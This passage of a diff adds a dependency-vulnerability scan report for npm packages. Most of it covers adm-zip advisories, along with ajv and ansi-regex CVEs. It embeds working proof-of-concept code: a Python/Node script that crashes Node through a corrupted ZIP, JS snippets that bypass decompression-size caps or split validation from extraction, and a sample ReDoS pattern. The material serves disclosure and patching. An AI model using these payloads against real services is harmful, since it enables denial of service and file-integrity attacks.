zip.toBuffer();\nconsole.log(\"BUILT_GOOD_ZIP bytes=\" + goodBuf.length);\n\n// Step 2: locate the local file header (offset 0 in this single-entry\n// archive) and corrupt ONLY the compressed-data bytes in place, leaving\n// every size/offset/CRC field in the local header, central directory, and\n// EOCD record untouched -- so adm-zip's own parser still finds and slices\n// exactly the right region and reaches the vulnerable inflateAsync() path.\nconst LOCSIG = 0x04034b50;\nif (goodBuf.readUInt32LE(0) !== LOCSIG) {\n    throw new Error(\"unexpected local header signature -- adm-zip writer output changed\");\n}\nconst compressedSize = goodBuf.readUInt32LE(18); // LOCSIZ\nconst fileNameLen = goodBuf.readUInt16LE(26); // LOCNAM\nconst extraLen = goodBuf.readUInt16LE(28); // LOCEXT\nconst dataStart = 30 + fileNameLen + extraLen;\nconst dataEnd = dataStart + compressedSize;\nconsole.log(\n    \"LOCAL_HEADER compressedSize=\" + compressedSize +\n    \" dataStart=\" + dataStart + \" dataEnd=\" + dataEnd\n);\n\nconst badBuf = Buffer.from(goodBuf); // copy, do not mutate original\nfor (let i = dataStart; i < dataEnd; i++) {\n    badBuf[i] = badBuf[i] ^ 0xff; // corrupt every byte of the DEFLATE stream\n}\nconsole.log(\"CORRUPTED_COMPRESSED_BYTES count=\" + (dataEnd - dataStart));\n\n// Step 3: parse the corrupted archive (this succeeds -- headers are intact)\n// and hit the vulnerable async decompression path.\nconst zip2 = new AdmZip(badBuf);\nconst entries = zip2.getEntries();\nconsole.log(\n    \"PARSED_CORRUPT_ZIP entries=\" + entries.length +\n    \" name=\" + entries[0].entryName\n);\n\ntry {\n    // This is the public, documented API a real server would call on an\n    // untrusted upload (readFileAsync / getDataAsync / extractAllToAsync\n    // all funnel into the same decompress(true, ...) -> inflateAsync path).\n    entries[0].getDataAsync(function (data, err) {\n        // If this ever fires, the library handled the error gracefully\n        // (no crash) -- meaning the vulnerability is NOT present / already\n        // fixed in this build.\n        console.log(\n            \"CALLBACK_FIRED data_len=\" + (data ? data.length : 0) +\n            \" err=\" + err\n        );\n    });\n    console.log(\"SYNC_CALL_RETURNED_NO_THROW\");\n} catch (e) {\n    // If this ever fires, the bug is NOT present -- the error would be\n    // synchronously catchable by ordinary calling code.\n    console.log(\"CAUGHT_BY_TRY_CATCH: \" + e.message);\n}\n\nconsole.log(\"HARNESS_END_OF_SYNCHRONOUS_CODE\");\n// Deliberately NOT registering process.on(\"uncaughtException\", ...) here --\n// doing so would mask the exact bug under test. A real, unmodified server\n// process has no reason to install a blanket uncaughtException handler\n// either; that is precisely what makes this an unrecoverable process crash.\n\"\"\" % {\"repo_dir\": repo_dir}\n\n\n# ============================================================\n# Step 1: Setup\n# ============================================================\ndef setup():\n    \"\"\"Verify prerequisites and write out the Node.js harness script.\"\"\"\n    print(f\"[*] Setting up PoC for {PACKAGE_NAME}@{TARGET_VERSION}\")\n    print(f\"[*] Target adm-zip source tree: {REPO_DIR}\")\n\n    main_entry = os.path.join(REPO_DIR, \"adm-zip.js\")\n    if not os.path.isfile(main_entry):\n        print(f\"[-] Cannot find adm-zip.js at {main_entry}\")\n        sys.exit(1)\n\n    try:\n        node_version = subprocess.run(\n            [NODE_BIN, \"--version\"], capture_output=True, text=True, timeout=10\n        )\n        print(f\"[*] Found Node.js: {node_version.stdout.strip()}\")\n    except FileNotFoundError:\n        print(\"[-] node binary not found on PATH -- required to run this PoC\")\n        sys.exit(1)\n\n    handle, harness_path = tempfile.mkstemp(prefix=\"admzip_async_dos_\", suffix=\".js\")\n    with os.fdopen(handle, \"w\") as f:\n        f.write(build_harness_script(REPO_DIR))\n    print(f\"[*] Wrote Node harness to {harness_path}\")\n    return harness_path\n\n\n# ============================================================\n# Step 2: Trigger the vulnerability\n# ============================================================\ndef trigger(harness_path):\n    \"\"\"Run the Node harness (in its own isolated child process) that builds\n    the malicious zip and feeds it into adm-zip's vulnerable async API.\"\"\"\n    print(\"[*] Triggering vulnerability (spawning isolated Node subprocess)...\")\n    try:\n        proc = subprocess.run(\n            [NODE_BIN, harness_path],\n            capture_output=True,\n            text=True,\n            timeout=SUBPROCESS_TIMEOUT_SECONDS,\n            cwd=REPO_DIR,\n        )\n        return {\n            \"timed_out\": False,\n            \"returncode\": proc.returncode,\n            \"stdout\": proc.stdout,\n            \"stderr\": proc.stderr,\n        }\n    except subprocess.TimeoutExpired as e:\n        return {\n            \"timed_out\": True,\n            \"returncode\": None,\n            \"stdout\": (e.stdout or b\"\").decode(errors=\"replace\") if isinstance(e.stdout, bytes) else (e.stdout or \"\"),\n            \"stderr\": (e.stderr or b\"\").decode(errors=\"replace\") if isinstance(e.stderr, bytes) else (e.stderr or \"\"),\n        }\n\n\n# ============================================================\n# Step 3: Verify impact\n# ============================================================\ndef verify(result):\n    \"\"\"Check that the child process crashed with an unhandled 'error' event\n    originating from the async inflater, and that neither the try/catch nor\n    the getDataAsync callback in the harness ever ran.\"\"\"\n    print(\"[*] Verifying impact...\")\n    print(f\"[*] Child process exit code: {result['returncode']}\")\n    print()\n    print(\"----- Node child process stdout -----\")\n    print(result[\"stdout\"].rstrip())\n    print(\"----- Node child process stderr (crash evidence) -----\")\n    print(result[\"stderr\"].rstrip())\n    print(\"--------------------------------------\")\n    print()\n\n    if result[\"timed_out\"]:\n        print(\"[-] Harness timed out instead of crashing -- inconclusive\")\n        return False\n\n    stdout = result[\"stdout\"]\n    stderr = result[\"stderr\"]\n    returncode = result[\"returncode\"]\n\n    reached_vuln_call = \"SYNC_CALL_RETURNED_NO_THROW\" in stdout\n    was_caught = \"CAUGHT_BY_TRY_CATCH\" in stdout\n    callback_fired = \"CALLBACK_FIRED\" in stdout\n    process_crashed = returncode is not None and returncode != 0\n    unhandled_error_evidence = (\n        \"Unhandled 'error' event\" in stderr\n        or \"ERR_UNHANDLED_ERROR\" in stderr\n        or \"Emitted 'error' event on InflateRaw instance\" in stderr\n    )\n\n    print(f\"[*] Reached vulnerable getDataAsync() call without throwing: {reached_vuln_call}\")\n    print(f\"[*] Caught by harness's own try/catch (would mean NOT vulnerable): {was_caught}\")\n    print(f\"[*] getDataAsync callback ever fired (would mean NOT vulnerable): {callback_fired}\")\n    print(f\"[*] Child process exited non-zero (crashed): {process_crashed}\")\n    print(f\"[*] stderr shows an unhandled 'error' event from the InflateRaw stream: {unhandled_error_evidence}\")\n\n    success = (\n        reached_vuln_call\n        and not was_caught\n        and not callback_fired\n        and process_crashed\n        and unhandled_error_evidence\n    )\n    return success\n\n\n# ============================================================\n# Main\n# ============================================================\nif __name__ == \"__main__\":\n    print(f\"=== CVE-CANDIDATE: {PACKAGE_NAME} async decompression DoS ===\")\n    print(f\"[*] Target version: {TARGET_VERSION}\")\n    print()\n\n    harness_path = setup()\n    try:\n        result = trigger(harness_path)\n        success = verify(result)\n    finally:\n        try:\n            os.remove(harness_path)\n            print(f\"[*] Cleaned up temp harness file: {harness_path}\")\n        except OSError:\n            pass\n\n    print()\n    if success:\n        print(\"[+] VULNERABILITY CONFIRMED\")\n        print(\n            \"[+] Impact: a single untrusted zip file with a corrupted DEFLATE \"\n            \"entry crashes the entire Node.js process when read via any \"\n            \"adm-zip *Async API (readFileAsync / readAsTextAsync / \"\n            \"extractAllToAsync / ZipEntry.getDataAsync). Unauthenticated, \"\n            \"single-request, unrecoverable process-level Denial of Service.\"\n        )\n    else:\n        print(\"[-] Vulnerability NOT confirmed\")\n\n    sys.exit(0 if success else 1)\n```",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-8238-w5pm-2374",
+            "https://github.com/advisories/GHSA-8238-w5pm-2374",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/5e70d3a26097d68fa981c41f022c053117174e49",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-8238-w5pm-2374"
+          ],
+          "PublishedDate": "2026-09-29T23:10:09Z",
+          "LastModifiedDate": "2026-09-29T23:10:09Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-rcw4-f5rp-g42v",
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-rcw4-f5rp-g42v",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:41c1cdb46622cbc02c6f64b4256bc9b59176a8ecef988e01a5efa83f4e3647a4",
+          "Title": "adm-zip: Decompression-bomb protection (fix for CVE-2026-39244) can be bypassed by declaring uncompressed size as 0",
+          "Description": "**Affected package:** adm-zip (npm)\n**Affected version:** 0.6.0\n\n## Summary\n\nThe fix shipped for CVE-2026-39244 (`methods/inflater.js`) caps zlib's decompression output via `maxOutputLength: expectedLength`, where `expectedLength` is read directly from the ZIP entry's attacker-controlled \"uncompressed size\" header field (`CENLEN`/`LOCLEN`). This cap is only applied when `expectedLength > 0`:\n\n```js\nconst option = version >= 15 && expectedLength > 0 ? { maxOutputLength: expectedLength } : {};\nreturn zlib.inflateRawSync(inbuf, option);\n```\n\nIf an attacker sets the declared uncompressed-size field to exactly **0**, this condition is false, `option` becomes `{}`, and no output cap is passed to zlib at all. Node then falls back to zlib's own internal default limit (several GB), so a small, highly-compressible payload can still be decompressed to a very large size in memory -- the same class of resource-exhaustion issue the original CVE addressed, just triggered differently.\n\n## Steps to Reproduce\n\n1. Build a ZIP archive containing one DEFLATE-compressed entry whose real content is highly redundant (e.g. several MB of a repeated byte, achieving close to the ~1032:1 theoretical raw-DEFLATE compression ratio).\n2. Patch the entry's declared uncompressed-size fields (both the local file header copy and the central directory copy, 4-byte little-endian values) to `0`. The compressed bytes and CRC32 are left untouched -- CRC validation still passes because CRC is computed over the real decompressed output, not the declared size.\n3. Load the archive with `new AdmZip(buffer)` and call `.getEntries()[0].getData()` (or `readFile`/`readAsText`/`extractAllTo`/etc. -- all share the same code path).\n4. Observe: decompression succeeds and returns the full-size buffer with no size restriction applied, whereas the same real data with an honest (but undersized) declared value correctly throws `Cannot create a Buffer larger than N bytes`.\n\n## Proof of Concept\n\nAttached script demonstrates a controlled A/B comparison using the identical real payload in both cases -- only the declared-size header field differs:\n\n- **Control** (declared size = 1024 bytes, deliberately smaller than the true 4MB output): correctly throws, proving the cap mechanism works when `expectedLength > 0`.\n- **Bypass** (declared size = 0, identical real payload): succeeds and returns the full 4,194,304-byte buffer with zero restriction.\n\nVerified reproducible across 3 independent runs.\n\n## Impact\n\nAny application that calls adm-zip's read/extract methods on an untrusted ZIP file (upload handlers, CI artifact extraction, email attachment scanning, etc.) can be made to allocate an amount of memory bounded only by zlib's own internal default rather than any limit the application or adm-zip intends -- a small (tens-of-MB) upload can trigger multi-GB memory consumption, risking process crash/OOM.\n\n## Suggested Fix\n\nApply `maxOutputLength` unconditionally (e.g. defaulting to a sane absolute ceiling, or always passing the declared size regardless of whether it's 0), and/or add an independent compression-ratio check that doesn't rely solely on the attacker-supplied size field.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-rcw4-f5rp-g42v",
+            "https://github.com/advisories/GHSA-rcw4-f5rp-g42v",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-rcw4-f5rp-g42v"
+          ],
+          "PublishedDate": "2026-09-29T18:25:20Z",
+          "LastModifiedDate": "2026-09-29T18:25:20Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-c6fg-446q-cg94",
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-c6fg-446q-cg94",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:06fb1b18043986b458bc11daeb59ebbb498c47fb79071026b7bae71ac16c6335",
+          "Title": "adm-zip: getDataAsync() bypasses the maxOutputLength size guard enforced by the synchronous getData() path",
+          "Description": "### Summary\nadm-zip enforces a `maxOutputLength` guard against decompression bombs on its synchronous `getData()` path, but the equivalent asynchronous `getDataAsync()` path does not enforce it — it accumulates and returns the entire decompressed output regardless of the entry's declared size. An application that checks an entry's declared size before deciding to process it, then reads the entry via `getDataAsync()` (a completely ordinary, often-recommended choice for I/O in Node.js), gets none of the protection it believes it has.\n\n\n### Details\n\n- `methods/inflater.js:3-10` passes `{maxOutputLength: expectedLength}` to `inflateRawSync`, which Node enforces.\n- `methods/inflater.js:12-31` passes the same option to `createInflateRaw` but never enforces it on the streaming path — it just accumulates every chunk and allocates a final Buffer of whatever size resulted.\n\n\n### PoC\n\n```js\nconst AdmZip = require('adm-zip');\nconst zip = new AdmZip();\nzip.addFile('p', Buffer.alloc(64 * 1024 * 1024, 0x41)); // 64 MiB\nconst raw = Buffer.from(zip.toBuffer());\n// patch the local + central declared uncompressed size to 1 byte\nraw.writeUInt32LE(1, localHeaderSizeOffset);\nraw.writeUInt32LE(1, centralHeaderSizeOffset);\nconst entry = new AdmZip(raw).getEntry('p');\n\nentry.getData();\n// throws: ERR_BUFFER_TOO_LARGE: Cannot create a Buffer larger than 1 bytes\n\nentry.getDataAsync((data, error) => { ... });\n// returns the full 67,108,864-byte buffer, error is undefined\n```\n\n### Impact\nAn application that validates a declared size before reading an entry, then uses the async API, gets no protection against a high-ratio DEFLATE payload. Repeated or larger requests could contribute to memory exhaustion.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-c6fg-446q-cg94",
+            "https://github.com/advisories/GHSA-c6fg-446q-cg94",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-c6fg-446q-cg94"
+          ],
+          "PublishedDate": "2026-09-29T23:10:32Z",
+          "LastModifiedDate": "2026-09-29T23:10:32Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-p634-w6r4-rjp2",
+          "PkgID": "adm-zip@0.4.7",
+          "PkgName": "adm-zip",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/adm-zip@0.4.7",
+            "UID": "52cd838e1c846549"
+          },
+          "InstalledVersion": "0.4.7",
+          "FixedVersion": "0.6.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-p634-w6r4-rjp2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:b3fce29ff9822f6a757bdb8fdaebe448fd2b48d9ac86c01dd04b0366e5dc7506",
+          "Title": "adm-zip: Duplicate ZIP entry names: getEntry() and extractAllTo() resolve to different content",
+          "Description": "### Summary\n\nA ZIP file can contain two entries with the identical name. adm-zip keeps both in its internal entry list, but its name-lookup table only retains the last one written. `getEntry(name)` and `extractAllTo()` walk these two different internal structures, so they can each resolve a duplicate name to a *different* entry. An application that validates a named entry's contents via `getEntry()` before trusting an archive, then extracts the whole archive, can end up approving one file's content while a different file's bytes are what actually land on disk under that name.\n\n### Details\n- `zipFile.js:58-83` retains both entries in `entryList` but overwrites `entryTable[name]` with only the last one written.\n- `adm-zip.js:83-95,658-663` uses `entryTable` for `getEntry()` lookups — returns the *last* duplicate.\n- `adm-zip.js:769-914` iterates `entryList` for extraction — writes the *first* duplicate (sync, default overwrite policy).\n\n\n### PoC\n```js\nconst AdmZip = require('adm-zip');\nconst z = new AdmZip({ noSort: true });\nz.addFile('a.txt', Buffer.from('FIRST'));\nz.addFile('b.txt', Buffer.from('SECOND'));\nconst raw = Buffer.from(z.toBuffer());\n// rename the a.txt entry to b.txt directly in the raw bytes\nfor (let at = raw.indexOf('a.txt'); at >= 0; at = raw.indexOf('a.txt', at + 5)) {\n  raw.write('b.txt', at);\n}\nconst parsed = new AdmZip(raw, { noSort: true });\nconst validated = parsed.getEntry('b.txt').getData().toString();\nparsed.extractAllTo(outDir, false);\n// validated === \"SECOND\", but the file written to disk === \"FIRST\"\n```\n\nReproduced on the pinned commit (`2b4d84087d45344643e0183756e19191d52815cc`)\n\n### Impact\nAn application that checks a named entry's content before trusting an untrusted ZIP, then extracts it, can be made to approve different bytes than what actually gets written to disk — the classic check/use split that this kind of validate-then-extract pattern relies on.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.9
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-p634-w6r4-rjp2",
+            "https://github.com/advisories/GHSA-p634-w6r4-rjp2",
+            "https://github.com/cthackers/adm-zip",
+            "https://github.com/cthackers/adm-zip/commit/05101d47b3b983b705cc3e66fc34366118ba7b99",
+            "https://github.com/cthackers/adm-zip/releases/tag/v0.6.1",
+            "https://github.com/cthackers/adm-zip/security/advisories/GHSA-p634-w6r4-rjp2"
+          ],
+          "PublishedDate": "2026-09-29T23:11:01Z",
+          "LastModifiedDate": "2026-09-29T23:11:01Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2020-15366",
+          "VendorIDs": [
+            "GHSA-v88g-cgmw-v5xw"
+          ],
+          "PkgID": "ajv@6.10.2",
+          "PkgName": "ajv",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ajv@6.10.2",
+            "UID": "60c16181eeda89a8"
+          },
+          "InstalledVersion": "6.10.2",
+          "FixedVersion": "6.12.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2020-15366",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:00fa805b50c8fb77d154833b45b18382e39968e4437ad9f03e1ecdf4fb0b458c",
+          "Title": "nodejs-ajv: prototype pollution via crafted JSON schema in ajv.validate function",
+          "Description": "An issue was discovered in ajv.validate() in Ajv (aka Another JSON Schema Validator) 6.12.2. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "alma": 2,
+            "ghsa": 2,
+            "nvd": 2,
+            "oracle-oval": 2,
+            "redhat": 2,
+            "rocky": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
+              "V3Score": 5.6
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:M/Au:N/C:P/I:P/A:P",
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
+              "V2Score": 6.8,
+              "V3Score": 5.6
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
+              "V3Score": 5.6
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2020-15366",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1857977",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1892430",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1898554",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1898680",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1912854",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1912863",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15366",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7754",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7774",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7788",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8265",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8277",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8287"
+          ],
+          "PublishedDate": "2020-07-15T20:15:13.38Z",
+          "LastModifiedDate": "2026-06-17T02:56:34.053Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-69873",
+          "VendorIDs": [
+            "GHSA-2g4f-4pwh-qvx6"
+          ],
+          "PkgID": "ajv@6.10.2",
+          "PkgName": "ajv",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ajv@6.10.2",
+            "UID": "60c16181eeda89a8"
+          },
+          "InstalledVersion": "6.10.2",
+          "FixedVersion": "8.18.0, 6.14.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-69873",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:450b2f7605be3df86817ba0cbe1c2aa378cf24ba9c32d975ed9b4e11b6b9ed19",
+          "Title": "ajv: ReDoS via $data reference",
+          "Description": "ajv (Another JSON Schema Validator) before 8.18.0 is vulnerable to Regular Expression Denial of Service (ReDoS) when the $data option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax ($data reference), which is passed directly to the JavaScript RegExp() constructor without validation. An attacker can inject a malicious regex pattern (e.g., \"^(a|a)*$\") combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with $data: true for dynamic schema validation. This issue is also fixed in version 6.14.0.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-1333",
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 5.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10093",
+            "https://access.redhat.com/errata/RHSA-2026:13512",
+            "https://access.redhat.com/errata/RHSA-2026:14774",
+            "https://access.redhat.com/errata/RHSA-2026:15091",
+            "https://access.redhat.com/errata/RHSA-2026:16874",
+            "https://access.redhat.com/errata/RHSA-2026:19712",
+            "https://access.redhat.com/errata/RHSA-2026:26211",
+            "https://access.redhat.com/errata/RHSA-2026:26214",
+            "https://access.redhat.com/errata/RHSA-2026:33371",
+            "https://access.redhat.com/errata/RHSA-2026:36651",
+            "https://access.redhat.com/errata/RHSA-2026:40118",
+            "https://access.redhat.com/errata/RHSA-2026:40945",
+            "https://access.redhat.com/errata/RHSA-2026:40984",
+            "https://access.redhat.com/errata/RHSA-2026:41941",
+            "https://access.redhat.com/errata/RHSA-2026:41944"
+          ],
+          "PublishedDate": "2026-02-11T19:15:50.467Z",
+          "LastModifiedDate": "2026-09-10T13:17:29.42Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2021-3807",
+          "VendorIDs": [
+            "GHSA-93q8-gq69-wqmw"
+          ],
+          "PkgID": "ansi-regex@3.0.0",
+          "PkgName": "ansi-regex",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ansi-regex@3.0.0",
+            "UID": "da59704b184f4bf"
+          },
+          "InstalledVersion": "3.0.0",
+          "FixedVersion": "6.0.1, 5.0.1, 4.1.1, 3.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2021-3807",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:2afa0420b5878f27f890960decaa2413fdc2b7227b64fb482349228e551d87f4",
+          "Title": "nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes",
+          "Description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "alma": 2,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 2,
+            "redhat": 2,
+            "rocky": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:L/Au:N/C:N/I:N/A:C",
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V2Score": 7.8,
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2022:6595",
+            "https://access.redhat.com/security/cve/CVE-2021-3807",
+            "https://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908",
+            "https://bugzilla.redhat.com/1907444",
+            "https://bugzilla.redhat.com/1945459",
+            "https://bugzilla.redhat.com/1964461",
+            "https://bugzilla.redhat.com/2007557",
+            "https://bugzilla.redhat.com/2098556",
+            "https://bugzilla.redhat.com/2102001",
+            "https://bugzilla.redhat.com/2105422",
+            "https://bugzilla.redhat.com/2105426",
+            "https://bugzilla.redhat.com/2105428",
+            "https://bugzilla.redhat.com/2105430",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1907444",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=1945459"
+          ],
+          "PublishedDate": "2021-09-17T07:15:09.273Z",
+          "LastModifiedDate": "2026-10-08T22:17:11.557Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2021-3807",
+          "VendorIDs": [
+            "GHSA-93q8-gq69-wqmw"
+          ],
+          "PkgID": "ansi-regex@4.1.0",
+          "PkgName": "ansi-regex",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/ansi-regex@4.1.0",
+            "UID": "4ab055b63a8e60b8"
+          },
+          "InstalledVersion": "4.1.0",
+          "FixedVersion": "6.0.1, 5.0.1, 4.1.1, 3.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2021-3807",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:6b06df2183c3011b44fa62afd38b6e682f2eab00bd7cb8cebebce40914c36d68",
+          "Title": "nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes",
+          "Description": "ansi-regex is vulnerable to Inefficient Regular Expression Complexity",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "alma": 2,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 2,
+            "redhat": 2,
+            "rocky": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V2Vector": "AV:N/AC:L/Au:N/C:N/I:N/A:C",
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
